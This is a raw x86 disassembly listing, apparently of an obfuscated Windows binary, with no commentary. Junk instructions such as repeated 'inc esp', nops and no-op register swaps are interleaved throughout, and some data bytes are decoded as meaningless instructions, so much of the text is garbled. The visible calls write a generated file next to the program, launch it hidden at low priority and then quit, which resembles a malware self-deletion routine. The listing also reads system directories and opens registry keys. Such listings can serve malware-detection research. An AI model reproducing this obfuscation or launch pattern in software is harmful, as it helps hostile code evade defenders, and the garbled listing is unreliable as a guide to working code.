inc esp
inc esp
inc esp
inc esp
inc esp
cmp [ ebp - 0x34 ] 0x400
mov eax eax
je r-xdata
mov ebx ebx
movsx eax [ ebp - 0x20 ]
movsx ecx [ ebp - 0x20 ]
xchg eax esi
mov esi [ ebp + esi * 4 - 0x30 ]
xchg esi eax
nop
and eax 0xff
mov [ ebp + ecx * 4 - 0x18 ] al
nop
movsx eax [ ebp - 0x20 ]
nop [ eax + eax ] eax
mov eax [ ebp + eax * 4 - 0x30 ]
nop [ eax + eax ] eax
sar eax 0x8
nop [ eax ] eax
movsx ecx [ ebp - 0x20 ]
nop [ eax + eax ] eax
and eax 0xff
nop [ eax ] eax
xchg eax ebx
mov [ ebp + ecx * 4 - 0x17 ] bl
xchg ebx eax
movsx eax [ ebp - 0x20 ]
nop [ eax ] eax
xchg esi eax
mov esi [ ebp + esi * 4 - 0x30 ]
xchg esi eax
movsx ecx [ ebp - 0x20 ]
mov ebx ebx
sar eax 0x10
nop [ eax + eax ] eax
and eax 0xff
nop
mov [ ebp + ecx * 4 - 0x16 ] al
nop [ eax ] eax
movsx ecx [ ebp - 0x20 ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
nop
jmp r-xdata
nop
push [ ebp - 0x43c ]
mov edi edi
call sub_406858
nop [ eax ] eax
or eax 0xffffffff
nop
pop ecx
nop
jmp r-xdata
movsx eax [ ebp - 0x20 ]
mov eax [ ebp + eax * 4 - 0x30 ]
nop [ eax ] eax
sar eax 0x18
and eax 0xff
xchg ebx ecx
mov ebx ebx
xchg ebx ecx
mov [ ebp + ecx * 4 - 0x15 ] al
nop
jmp r-xdata
cmp [ ebp - 0x4 ] 0x3f0
nop
jge r-xdata
mov ax [ ebp - 0x20 ]
add ax 0x1
mov [ ebp - 0x20 ] ax
cmp [ ebp - 0x4 ] 0x3f0
nop
jge r-xdata
nop [ eax ] eax
lea eax [ ebp - 0x18 ]
push 0x10
nop
push eax
mov edi edi
mov eax [ ebp - 0x4 ]
lea eax [ ebp + eax - 0x438 ]
nop [ eax ] eax
push eax
call sub_406820
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
push edi
pop edi
test eax eax
nop [ eax ] eax
jne r-xdata
mov eax [ ebp - 0x1c ]
mov ebp ebp
add eax 0x3f0
push 0x1
nop [ eax ] eax
mov [ ebp - 0x1c ] eax
pop eax
xchg eax ecx
test ecx ecx
xchg ecx eax
jne r-xdata
nop [ eax ] eax
mov ecx [ ebp - 0x1c ]
nop [ eax ] eax
mov eax [ ebp - 0x4 ]
nop [ eax ] eax
lea eax [ ecx + eax + 0x10 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
jmp r-xdata
nop [ eax + eax ] eax
jmp r-xdata
nop
push [ ebp - 0x43c ]
nop
call sub_406858
pop ecx
nop
mov eax [ ebp - 0x1c ]
nop [ eax ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esp esp
inc eax
mov [ ebp - 0x4 ] eax
nop
sub_404381
jmp r-xdata
movsb [ edi ] [ esi ]
adc [ eax ] 0x76
pop ebp
mov bl 0x38
das
outsd
pop esp
inc edi
jge r-xdata
cmp [ edi ] ch
jle r-xdata
movsb [ edi ] [ esi ]
ffree st6
ror [ esi ] 0x1
xor al 0x7f
jecxz r-xdata
sbb [ edi - 0x75 ] ebp
push es
ror [ esi - 0x5c ] 0x80
adc [ esi + 0x5d ] dh
mov dh 0xbb
sub_404383
popfd
aaa
leave
outsd
stc
or eax 0x572e5640
push edi
jno r-xdata
add [ eax - 0x2b421b08 ] dl
scasb [ edi ]
pop es
mov bl 0x38
das
outsd
pop esp
inc edi
jge r-xdata
cmp [ edi ] ch
jle r-xdata
sbb [ edi - 0x75 ] ebp
push es
ror [ esi - 0x5c ] 0x80
adc [ esi + 0x5d ] dh
movsb [ edi ] [ esi ]
ffree st6
ror [ esi ] 0x1
xor al 0x7f
jecxz r-xdata
mov dh 0xbb
sub_4043c6
push ebp
mov ebp esp
sub esp 0x404
push ebx
push esi
push edi
push 0x100
push ebp
pop ebp
and [ ebp - 0x304 ] 0x0
nop
lea eax [ ebp - 0x404 ]
push eax
call [ GetSystemDirectoryA@IAT ]
nop
and [ ebp - 0x304 ] 0x0
mov eax 0x0
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp - 0x304 ]
nop [ eax ] eax
push [ eax * 4 + rw-data ]
nop [ eax ] eax
lea eax [ ebp - 0x300 ]
nop
push eax
nop
call sub_40e8d0
pop ecx
nop [ eax ] eax
lea eax [ ebp - 0x300 ]
nop [ eax ] eax
pop ecx
nop [ eax + eax ] eax
push rw-data
push esi
pop esi
push eax
nop
call sub_4066e3
pop ecx
nop
pop ecx
nop
push eax
push [ ebp + 0xc ]
call sub_406430
jmp r-xdata
pop ecx
nop
pop ecx
nop [ eax ] eax
push rw-data
nop [ eax + eax ] eax
push 0x0
call sub_4066e3
mov eax eax
pop ecx
pop ecx
nop [ eax + eax ] eax
push rw-data
push 0x0
call sub_4066e3
mov eax eax
pop ecx
nop [ eax + eax ] eax
pop ecx
nop [ eax ] eax
push rw-data
nop [ eax ] eax
push 0x0
nop
call sub_4066e3
nop [ eax ] eax
pop ecx
nop [ eax ] eax
pop ecx
push eax
nop [ eax + eax ] eax
lea eax [ ebp - 0x100 ]
push eax
nop [ eax ] eax
call sub_406430
push edx
pop edx
movsx eax [ ebp - 0x100 ]
jmp r-xdata
pop ecx
nop [ eax ] eax
cmp eax 0x5c
nop
pop ecx
nop
jne r-xdata
lea eax [ ebp - 0x404 ]
nop [ eax ] eax
push eax
push [ ebp + 0x8 ]
mov esi esi
call sub_406430
pop ecx
pop ecx
nop [ eax ] eax
lea eax [ ebp - 0x100 ]
mov ebp ebp
push eax
nop [ eax ] eax
xchg edx eax
lea edx [ ebp - 0x404 ]
xchg edx eax
push eax
push ebp
pop ebp
push rw-data
nop [ eax ] eax
push [ ebp + 0x8 ]
call sub_406520
inc esp
inc esp
inc esp
inc esp
inc esp
add esp 0x6
inc esp
inc esp
inc esp
add esp 0x2
push ebp
pop ebp
jmp r-xdata
mov eax [ ebp - 0x304 ]
nop
inc eax
nop [ eax ] eax
mov [ ebp - 0x304 ] eax
nop [ eax ] eax
jmp r-xdata
nop
push 0x1
nop
pop eax
jmp r-xdata
push [ ebp + 0xc ]
nop
push [ ebp + 0x8 ]
nop
push rw-data
nop [ eax + eax ] eax
lea eax [ ebp - 0x100 ]
nop
push eax
nop
call sub_406520
nop [ eax ] eax
add esp 0x4
add esp 0x9
add esp 0x1
inc esp
inc esp
nop [ eax ] eax
lea eax [ ebp - 0x100 ]
push eax
call sub_40e5f0
nop [ eax ] eax
test eax eax
nop
pop ecx
nop
je r-xdata
mov eax [ ebp - 0x304 ]
nop [ eax + eax ] eax
cmp [ eax * 4 + rw-data ] 0x0
nop
je r-xdata
sub_404693
pop edi
xchg edx eax
xchg ebx eax
dec esi
0x9f3e8d07 0x818d
neg [ esi ]
cmp [ edi - 0x1 ] ecx
movsd [ edi ] [ esi ]
sbb [ esi + 0x2 ] 0xd2ad190c
sbb al 0xc
pop ds
popfd
sbb [ 0x5ef26f01 ] 0x109de9de
xchg [ edx - 0x2a ] al
mov ebp 0x92017d5b
fsubp st3
mov edi 0x57e37800
xchg ebp eax
mov edi [ esi + 0x17ba1666 ]
leave
fbstp [ edi + 0x43 ]
leave
jle r-xdata
or eax 0xb66f8d86
test al 0xce
[ edx ]
sub_40470c
push ebp
mov ebp esp
sub esp 0x750
push ebx
push esi
push edi
push 0x104
nop [ eax ] eax
lea eax [ ebp - 0x31c ]
push eax
jmp r-xdata
push 0x0
nop
call [ GetModuleFileNameA@IAT ]
jmp r-xdata
lea eax [ ebp - 0x31c ]
push eax
nop
lea eax [ ebp - 0x218 ]
nop [ eax ] eax
push eax
nop [ eax + eax ] eax
call [ lstrcpyA@IAT ]
nop
push 0x5c
nop
lea eax [ ebp - 0x218 ]
nop [ eax ] eax
push eax
jmp r-xdata
call sub_406af0
jmp r-xdata
and [ eax ] 0x0
nop [ eax ] eax
lea eax [ ebp - 0x218 ]
nop
pop ecx
pop ecx
jmp r-xdata
push eax
lea eax [ ebp - 0x114 ]
jmp r-xdata
push eax
nop [ eax ] eax
call [ lstrcpyA@IAT ]
push rw-data
lea eax [ ebp - 0x114 ]
nop [ eax + eax ] eax
push eax
nop [ eax + eax ] eax
call [ lstrcatA@IAT ]
push rw-data
xchg edx eax
lea edx [ ebp - 0x114 ]
xchg edx eax
nop
push eax
nop [ eax + eax ] eax
call [ lstrcatA@IAT ]
push 0x0
push eax
pop eax
lea eax [ ebp - 0x114 ]
push 0x8000080
nop
push 0x2
nop [ eax + eax ] eax
push 0x0
mov ecx ecx
push 0x0
push 0x40000000
nop
push eax
nop [ eax + eax ] eax
call [ CreateFileA@IAT ]
xchg eax edi
mov [ ebp - 0x364 ] edi
xchg edi eax
nop
cmp [ ebp - 0x364 ] 0xffffffff
nop [ eax ] eax
je r-xdata
push 0x0
nop
nop
push ebp
pop ebp
call [ PostQuitMessage@IAT ]
nop [ eax ] eax
jmp r-xdata
nop [ eax + eax ] eax
lea eax [ ebp - 0x114 ]
nop [ eax ] eax
push eax
nop [ eax + eax ] eax
lea eax [ ebp - 0x31c ]
nop
push eax
nop [ eax ] eax
lea eax [ ebp - 0x31c ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
push eax
jmp r-xdata
push rw-data
xchg edi eax
lea edi [ ebp - 0x750 ]
xchg eax edi
push eax
call [ wsprintfA@IAT ]
nop [ eax + eax ] eax
inc esp
add esp 0x2
inc esp
add esp 0x1
add esp 0x1
add esp 0x1
inc esp
add esp 0x2
inc esp
inc esp
inc esp
inc esp
inc esp
add esp 0x2
add esp 0x3
nop [ eax ] eax
lea eax [ ebp - 0x368 ]
nop [ eax + eax ] eax
push 0x0
nop [ eax ] eax
push eax
lea eax [ ebp - 0x750 ]
nop [ eax ] eax
push eax
nop [ eax ] eax
call [ lstrlenA@IAT ]
nop [ eax ] eax
push eax
jmp r-xdata
lea eax [ ebp - 0x750 ]
mov edx edx
push eax
nop
push [ ebp - 0x364 ]
jmp r-xdata
call [ WriteFile@IAT ]
nop
push [ ebp - 0x364 ]
call [ CloseHandle@IAT ]
jmp r-xdata
push 0x64
xchg ecx esi
mov esi esi
xchg esi ecx
call [ Sleep@IAT ]
mov ebx ebx
lea eax [ ebp - 0x360 ]
jmp r-xdata
push 0x44
push edi
pop edi
push 0x0
nop
push eax
call sub_406580
mov [ ebp - 0x360 ] 0x44
mov [ ebp - 0x334 ] 0x1
mov ebx ebx
inc esp
add esp 0x2
inc esp
add esp 0x1
inc esp
inc esp
add esp 0x1
inc esp
inc esp
inc esp
inc esp
nop [ eax ] eax
and [ ebp - 0x330 ] 0x0
nop [ eax + eax ] eax
lea eax [ ebp - 0x10 ]
nop [ eax ] eax
push eax
lea eax [ ebp - 0x360 ]
jmp r-xdata
push eax
push 0x0
nop [ eax ] eax
push 0x0
nop [ eax ] eax
xchg eax esi
lea esi [ ebp - 0x114 ]
xchg esi eax
nop [ eax ] eax
push 0x44
push 0x0
nop [ eax + eax ] eax
push 0x0
push 0x0
push eax
push eax
pop eax
push 0x0
mov edx edx
call [ CreateProcessA@IAT ]
mov ebx ebx
xchg eax ebx
test ebx ebx
xchg eax ebx
xchg ecx eax
mov eax eax
xchg eax ecx
je r-xdata
push 0xfffffff1
push [ ebp - 0xc ]
nop
call [ SetThreadPriority@IAT ]
push 0xf
nop
call [ GetCurrentThread@IAT ]
push eax
nop
call [ SetThreadPriority@IAT ]
nop
push 0x80
call [ GetCurrentProcess@IAT ]
nop [ eax ] eax
push eax
nop [ eax ] eax
call [ SetPriorityClass@IAT ]
push [ ebp - 0x10 ]
nop
call [ CloseHandle@IAT ]
push [ ebp - 0xc ]
nop [ eax ] eax
call [ ResumeThread@IAT ]
push eax
pop eax
push [ ebp - 0xc ]
call [ CloseHandle@IAT ]
nop
sub_404a61
lodsd [ esi ]
xor [ ecx - 0x6e ] edx
aaa
mov eax 0x5e5f92c0
pop ebx
leave
retn
cmp [ ebx - 0x119fe7ca ] 0xbb
or [ eax ] al
bound esi [ ecx - 0x30 ]
shr [ ebx ] 0x1
int 0x3
dec eax
or [ ecx ] cl
lahf
mov dh 0x6d
and al 0xb4
rcr [ gs : ebx ] cl
push edx
cmc
cmp eax 0xdf8b768
mov ecx 0xf407cbb7
insd
mov dh 0xa4
push 0x23
inc ebp
fwait
pop ecx
jge r-xdata
lodsb [ esi ]
cmpsb [ esi ] [ edi ]
jmp r-xdata
jpe r-xdata
push ecx
xchg edx eax
sub_404ad8
push ebp
mov ebp esp
sub esp 0x104
push ebx
push esi
push edi
push [ ebp + 0x10 ]
nop [ eax ] eax
push [ ebp + 0x8 ]
nop [ eax ] eax
push rw-data
push eax
pop eax
xchg eax edi
lea edi [ ebp - 0x100 ]
xchg edi eax
nop
push eax
call sub_406520
inc esp
add esp 0x2
inc esp
inc esp
add esp 0x1
add esp 0x1
inc esp
inc esp
add esp 0x1
inc esp
add esp 0x2
inc esp
inc esp
inc esp
push [ ebp + 0x8 ]
nop
lea eax [ ebp - 0x100 ]
push eax
nop [ eax ] eax
push 0x70
nop [ eax ] eax
push rw-data
nop [ eax + eax ] eax
call sub_403d4a
nop
add esp 0x7
inc esp
add esp 0x6
inc esp
inc esp
nop
test eax eax
nop [ eax ] eax
jne r-xdata
lea eax [ ebp - 0x100 ]
push eax
call sub_4052d5
nop [ eax ] eax
pop ecx
nop [ eax + eax ] eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
nop [ eax ] eax
xchg edx eax
lea edx [ ebp - 0x100 ]
xchg edx eax
nop [ eax + eax ] eax
push rw-data
nop [ eax + eax ] eax
push eax
mov ebp ebp
call sub_406520
mov ebp ebp
lea eax [ ebp - 0x100 ]
inc esp
add esp 0x1
add esp 0x1
add esp 0x2
add esp 0x2
add esp 0x1
add esp 0x1
add esp 0x1
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
nop [ eax + eax ] eax
push rw-data
nop [ eax ] eax
push eax
nop
call sub_406ad6
nop [ eax ] eax
mov [ ebp - 0x104 ] eax
nop [ eax ] eax
pop ecx
cmp [ ebp - 0x104 ] 0x0
pop ecx
nop [ eax + eax ] eax
jne r-xdata
nop [ eax ] eax
xchg edx eax
mov edx 0x0
xchg edx eax
nop
jmp r-xdata
push [ ebp - 0x104 ]
push 0x400
nop [ eax ] eax
push 0x1
nop
push rw-data
push ebp
pop ebp
call sub_406b17
nop [ eax + eax ] eax
inc esp
add esp 0x1
add esp 0x3
add esp 0x1
add esp 0x1
add esp 0x1
add esp 0x1
add esp 0x1
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
push [ ebp - 0x104 ]
nop [ eax ] eax
call sub_406858
nop [ eax ] eax
pop ecx
nop [ eax + eax ] eax
lea eax [ ebp - 0x100 ]
nop
push eax
jmp r-xdata
nop [ eax ] eax
mov eax 0x0
nop [ eax + eax ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_4052d5
nop [ eax ] eax
pop ecx
push 0x1
pop eax
nop [ eax ] eax
jmp r-xdata
sub_404db8
push ebp
mov ebp esp
sub esp 0x118
push ebx
push esi
push edi
and [ ebp - 0x118 ] 0x0
nop [ eax ] eax
push rw-data
nop
and [ ebp - 0x8 ] 0x0
nop [ eax + eax ] eax
and [ ebp - 0x114 ] 0x0
mov ebp ebp
and [ ebp - 0x4 ] 0x0
mov ecx ecx
push [ ebp + 0x8 ]
call sub_406ad6
nop
pop ecx
nop [ eax ] eax
mov [ ebp - 0x8c ] eax
nop
cmp [ ebp - 0x8c ] 0x0
nop [ eax ] eax
pop ecx
jne r-xdata
push [ ebp - 0x8c ]
nop [ eax ] eax
lea eax [ ebp - 0x110 ]
nop
push 0x4
nop [ eax + eax ] eax
push 0x1
push eax
nop [ eax + eax ] eax
call sub_4068d5
add esp 0x10
cmp eax 0x4
jmp r-xdata
mov edx edx
or eax 0xffffffff
nop [ eax + eax ] eax
jmp r-xdata
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
and [ ebp - 0x10c ] 0x0
lea eax [ ebp - 0x110 ]
push eax
nop [ eax ] eax
lea eax [ ebp - 0x88 ]
nop
push eax
nop [ eax ] eax
call sub_40e8d0
jmp r-xdata
jmp r-xdata
pop ecx
nop [ eax ] eax
pop ecx
nop [ eax ] eax
push [ ebp + 0xc ]
jmp r-xdata
push [ ebp - 0x8c ]
call sub_406858
pop ecx
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x88 ]
push eax
nop [ eax ] eax
call sub_40cbf0
push ebx
pop ebx
pop ecx
nop [ eax ] eax
test eax eax
jmp r-xdata
pop ecx
nop
jne r-xdata
push [ ebp - 0x8c ]
nop
push 0xc
nop [ eax ] eax
lea eax [ ebp - 0x110 ]
nop [ eax ] eax
push 0x1
push ecx
pop ecx
push eax
call sub_4068d5
nop
add esp 0x10
nop [ eax ] eax
cmp eax 0xc
nop [ eax + eax ] eax
je r-xdata
push [ ebp - 0x8c ]
push 0xc
lea eax [ ebp - 0x110 ]
nop [ eax ] eax
push 0x1
jmp r-xdata
and [ ebp - 0x104 ] 0x0
mov ebp ebp
lea eax [ ebp - 0x110 ]
push eax
nop
lea eax [ ebp - 0x88 ]
nop [ eax ] eax
push eax
call sub_40e8d0
jmp r-xdata
jmp r-xdata
push eax
nop
call sub_4068d5
add esp 0x10
nop
cmp eax 0xc
je r-xdata
pop ecx
push eax
pop eax
lea eax [ ebp - 0x88 ]
nop [ eax ] eax
pop ecx
mov edx edx
push eax
nop [ eax + eax ] eax
call sub_406d24
mov [ ebp - 0x8 ] eax
pop ecx
push 0x1
push [ ebp - 0x8 ]
push [ ebp - 0x8c ]
call sub_4069ec
add esp 0xc
test eax eax
je r-xdata
jmp r-xdata
and [ ebp - 0x104 ] 0x0
jmp r-xdata
nop [ eax + eax ] eax
jmp r-xdata
push 0x1
pop eax
test eax eax
jne r-xdata
jmp r-xdata
lea eax [ ebp - 0x110 ]
jmp r-xdata
push eax
nop [ eax ] eax
lea eax [ ebp - 0x88 ]
nop
push eax
nop
call sub_40e8d0
nop [ eax ] eax
pop ecx
jmp r-xdata
pop ecx
mov ecx ecx
lea eax [ ebp - 0x88 ]
nop [ eax ] eax
push eax
nop [ eax ] eax
call sub_406d24
jmp r-xdata
mov [ ebp - 0x8 ] eax
nop [ eax ] eax
pop ecx
nop
push rw-data
jmp r-xdata
push [ ebp + 0x10 ]
nop [ eax ] eax
call sub_406ad6
mov [ ebp - 0x90 ] eax
pop ecx
nop
cmp [ ebp - 0x90 ] 0x0
nop
pop ecx
nop [ eax ] eax
jne r-xdata
mov eax [ ebp - 0x8 ]
imul eax eax 0x6
nop [ eax ] eax
push eax
nop [ eax ] eax
call sub_406c98
nop [ eax ] eax
pop ecx
mov [ ebp - 0x4 ] eax
nop
cmp [ ebp - 0x4 ] 0x0
nop
jne r-xdata
nop
push [ ebp - 0x8c ]
nop [ eax ] eax
call sub_406858
or eax 0xffffffff
nop [ eax + eax ] eax
pop ecx
nop
jmp r-xdata
mov eax [ ebp - 0x8 ]
nop [ eax ] eax
inc eax
nop [ eax ] eax
push eax
call sub_406c98
nop [ eax ] eax
mov [ ebp - 0x114 ] eax
nop [ eax ] eax
pop ecx
cmp [ ebp - 0x114 ] 0x0
jne r-xdata
push [ ebp - 0x8c ]
push edi
pop edi
call sub_406858
pop ecx
push [ ebp - 0x90 ]
nop
call sub_406858
nop
pop ecx
mov edi edi
or eax 0xffffffff
nop [ eax + eax ] eax
jmp r-xdata
push [ ebp - 0x8c ]
nop [ eax ] eax
push [ ebp - 0x8 ]
mov esi esi
push 0x1
push [ ebp - 0x4 ]
call sub_411a40
nop [ eax ] eax
add esp 0x10
mov eax eax
mov eax [ ebp - 0x4 ]
jmp r-xdata
nop [ eax ] eax
push [ ebp - 0x8c ]
call sub_406858
pop ecx
push [ ebp - 0x90 ]
push edi
pop edi
call sub_406858
nop
pop ecx
nop [ eax + eax ] eax
push [ ebp - 0x4 ]
call sub_406c50
nop [ eax ] eax
or eax 0xffffffff
pop ecx
nop [ eax + eax ] eax
jmp r-xdata
add eax [ ebp - 0x8 ]
mov esp esp
and [ eax ] 0x0
nop [ eax + eax ] eax
push [ ebp - 0x8 ]
nop
push [ ebp - 0x4 ]
push [ ebp - 0x114 ]
call sub_40e980
nop
mov eax [ ebp - 0x8 ]
nop
add esp 0xc
push ebp
pop ebp
imul eax eax 0x6
nop [ eax + eax ] eax
push eax
nop [ eax + eax ] eax
push 0x0
push [ ebp - 0x4 ]
nop [ eax ] eax
call sub_406580
push edi
pop edi
mov eax [ ebp - 0x8 ]
push eax
pop eax
add esp 0xc
mov edi edi
imul eax eax 0x6
nop [ eax ] eax
mov [ ebp - 0x118 ] eax
push ecx
pop ecx
push [ ebp - 0x8 ]
nop
push [ ebp - 0x114 ]
lea eax [ ebp - 0x118 ]
nop
push eax
push [ ebp - 0x4 ]
call sub_40ee80
push esi
pop esi
add esp 0x10
test eax eax
nop [ eax ] eax
jge r-xdata
push [ ebp - 0x90 ]
nop [ eax + eax ] eax
push [ ebp - 0x118 ]
mov esp esp
push 0x1
nop [ eax + eax ] eax
push [ ebp - 0x4 ]
nop [ eax ] eax
call sub_4119e0
nop
add esp 0x10
nop
push [ ebp - 0x8c ]
nop [ eax + eax ] eax
call sub_406858
nop [ eax ] eax
pop ecx
nop
push [ ebp - 0x90 ]
nop
call sub_406858
nop [ eax ] eax
pop ecx
nop
push [ ebp - 0x4 ]
call sub_406c50
nop [ eax + eax ] eax
pop ecx
nop [ eax + eax ] eax
push [ ebp - 0x114 ]
call sub_406c50
xor eax eax
pop ecx
nop
jmp r-xdata
push [ ebp - 0x8c ]
call sub_406858
nop
pop ecx
nop
push [ ebp - 0x90 ]
push edx
pop edx
call sub_406858
pop ecx
nop
push [ ebp - 0x4 ]
nop
call sub_406c50
nop
pop ecx
mov esp esp
push [ ebp - 0x114 ]
jmp r-xdata
call sub_406c50
nop
or eax 0xffffffff
push esi
pop esi
pop ecx
jmp r-xdata
jmp r-xdata
sub_4052d5
push ebp
mov ebp esp
sub esp 0x264
push ebx
push esi
push edi
lea eax [ ebp - 0x34 ]
push ecx
pop ecx
push 0x32
push eax
nop [ eax ] eax
call [ GetWindowsDirectoryA@IAT ]
nop [ eax + eax ] eax
lea eax [ ebp - 0x14c ]
nop [ eax + eax ] eax
push eax
push esi
pop esi
lea eax [ ebp - 0x34 ]
push eax
mov esp esp
call sub_412926
lea eax [ ebp - 0x264 ]
nop [ eax ] eax
push eax
push edi
pop edi
push [ ebp + 0x8 ]
jmp r-xdata
call sub_412926
xchg edx eax
test edx edx
xchg edx eax
mov esi esi
jne r-xdata
mov eax [ ebp - 0x14c ]
nop
xchg eax ecx
mov [ ebp - 0x264 ] ecx
xchg ecx eax
nop [ eax ] eax
mov eax [ ebp - 0x14c ]
nop
xchg eax edx
mov [ ebp - 0x260 ] edx
xchg edx eax
mov eax [ ebp - 0x14c ]
nop [ eax + eax ] eax
mov [ ebp - 0x25c ] eax
nop [ eax + eax ] eax
lea eax [ ebp - 0x264 ]
push eax
push [ ebp + 0x8 ]
nop [ eax + eax ] eax
call sub_412a8b
nop
nop
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_405553
push ebp
mov ebp esp
sub esp 0x408
push ebx
push esi
push edi
push rw-data
push [ ebp + 0x8 ]
call sub_406ad6
mov [ ebp - 0x408 ] eax
push ebp
pop ebp
pop ecx
cmp [ ebp - 0x408 ] 0x0
pop ecx
nop [ eax ] eax
jne r-xdata
push [ ebp - 0x408 ]
nop [ eax + eax ] eax
push 0x400
nop [ eax ] eax
lea eax [ ebp - 0x400 ]
jmp r-xdata
jmp r-xdata
push 0x1
nop [ eax ] eax
push eax
push ecx
pop ecx
call sub_4068d5
nop [ eax ] eax
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
jmp r-xdata
mov eax 0x0
push eax
pop eax
jmp sub_405841
push [ ebp - 0x408 ]
nop [ eax ] eax
call sub_406858
nop
pop ecx
nop
push [ ebp + 0x8 ]
call sub_4122aa
nop [ eax + eax ] eax
pop ecx
push [ ebp + 0xc ]
nop
call sub_404024
nop
mov [ ebp - 0x404 ] eax
pop ecx
nop [ eax ] eax
push rw-data
nop
push [ ebp + 0xc ]
mov ebp ebp
call sub_406ad6
nop [ eax + eax ] eax
pop ecx
mov [ ebp - 0x408 ] eax
nop [ eax ] eax
cmp [ ebp - 0x408 ] 0x0
nop [ eax ] eax
pop ecx
jne r-xdata
push 0x0
push [ ebp - 0x404 ]
push [ ebp - 0x408 ]
nop
call sub_4069ec
nop
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
nop [ eax + eax ] eax
push [ ebp - 0x408 ]
lea eax [ ebp - 0x400 ]
push 0x400
push 0x1
nop
push eax
call sub_406b17
nop [ eax + eax ] eax
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
inc esp
nop [ eax ] eax
push [ ebp - 0x408 ]
call sub_406858
pop ecx
nop [ eax ] eax
push [ ebp + 0xc ]
nop [ eax ] eax
push 0x0
mov edx edx
call sub_40e730
nop [ eax ] eax
pop ecx
nop
pop ecx
jmp r-xdata
mov eax 0x0
push eax
pop eax
jmp sub_405841
push 0x1
pop eax
nop
jmp sub_405841
sub_405846
push ebp
mov ebp esp
sub esp 0x84
push ebx
push esi
push edi
lea eax [ ebp - 0x84 ]
nop [ eax + eax ] eax
push rw-data
push eax
nop [ eax ] eax
call sub_40e8d0
nop [ eax ] eax
pop ecx
nop [ eax ] eax
xchg ebx eax
lea ebx [ ebp - 0x4 ]
xchg ebx eax
push ebx
pop ebx
pop ecx
nop
push eax
nop [ eax + eax ] eax
lea eax [ ebp - 0x84 ]
nop
push 0x20019
nop [ eax + eax ] eax
push 0x0
nop
push eax
push 0x80000002
nop [ eax ] eax
call [ RegOpenKeyExA@IAT ]
nop [ eax ] eax
test eax eax
jne r-xdata
mov eax 0x0
nop [ eax ] eax
jmp r-xdata
nop
push [ ebp - 0x4 ]
push eax
pop eax
call [ RegCloseKey@IAT ]
nop
push 0x1
nop [ eax + eax ] eax
pop eax
nop [ eax ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_405aa9
push ebp
mov ebp esp
sub esp 0x84
push ebx
push esi
push edi
lea eax [ ebp - 0x84 ]
jmp r-xdata
push rw-data
nop [ eax ] eax
push eax
call sub_40e8d0
nop
pop ecx
nop
lea eax [ ebp - 0x4 ]
nop [ eax ] eax
pop ecx
nop
push eax
push 0x20019
lea eax [ ebp - 0x84 ]
push ebx
pop ebx
push 0x0
nop [ eax ] eax
push eax
nop [ eax ] eax
push 0x80000002
nop [ eax ] eax
call [ RegOpenKeyExA@IAT ]
nop [ eax ] eax
test eax eax
jne r-xdata
mov eax 0x0
jmp r-xdata
nop [ eax ] eax
push [ ebp - 0x4 ]
nop [ eax + eax ] eax
call [ RegCloseKey@IAT ]
nop
push 0x1
pop eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
jmp r-xdata
sub_405d65
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
and [ esi + 0xc ] 0x0
and [ esi + 0x8 ] 0x0
mov [ esi ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x4 ] eax
lea eax [ esi + 0x10 ]
push eax
call [ InitializeCriticalSection@IAT ]
mov eax esi
pop esi
retn 0x8
sub_405da1
push esi
mov esi ecx
push edi
lea edi [ esi + 0x10 ]
push edi
call [ EnterCriticalSection@IAT ]
mov ecx [ esi + 0x8 ]
call sub_412608
and [ esi + 0x8 ] 0x0
and [ esi + 0xc ] 0x0
push edi
call [ LeaveCriticalSection@IAT ]
pop edi
pop esi
retn
sub_405dc9
mov eax sub_418078
call sub_4072e4
sub esp 0xc
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
lea ebx [ esi + 0x10 ]
push ebx
call [ EnterCriticalSection@IAT ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov edi [ esi + 0xc ]
push ebx
mov eax [ edi ]
mov [ esi + 0xc ] eax
call [ LeaveCriticalSection@IAT ]
mov ecx [ ebp - 0xc ]
mov eax edi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
push [ esi ]
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x8 ]
push [ esi + 0x4 ]
push eax
call sub_4125e8
mov ecx [ esi + 0x4 ]
dec ecx
mov edx ecx
imul edx [ esi ]
test ecx ecx
lea eax [ edx + eax + 0x4 ]
jl r-xdata
inc ecx
mov edx [ esi + 0xc ]
mov [ eax ] edx
mov [ esi + 0xc ] eax
sub eax [ esi ]
dec ecx
jne r-xdata
sub_405e58
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
test edi edi
je r-xdata
pop edi
pop esi
retn 0x4
push ebx
lea ebx [ esi + 0x10 ]
push ebx
call [ EnterCriticalSection@IAT ]
mov eax [ esi + 0xc ]
push ebx
mov [ edi ] eax
mov [ esi + 0xc ] edi
call [ LeaveCriticalSection@IAT ]
pop ebx
sub_405f32
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
je r-xdata
push r--data
call [ GetModuleHandleA@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
xor eax eax
